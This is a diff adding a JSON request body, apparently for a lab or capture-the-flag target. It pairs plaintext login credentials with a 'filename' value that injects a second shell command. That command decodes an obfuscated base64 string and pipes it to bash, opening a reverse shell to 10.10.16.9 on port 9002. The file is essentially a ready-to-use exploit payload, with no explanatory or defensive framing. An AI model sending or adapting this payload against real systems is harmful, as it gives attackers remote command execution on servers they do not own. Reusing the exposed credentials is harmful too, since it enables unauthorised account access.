@@ -1,0 +1,8 @@
+{
+    "auth":
+    {
+        "name":"felamos",
+        "password":"Winter2021"
+    },
+    "filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDIgMD4mMQo= | base64 -d | bash"
+}
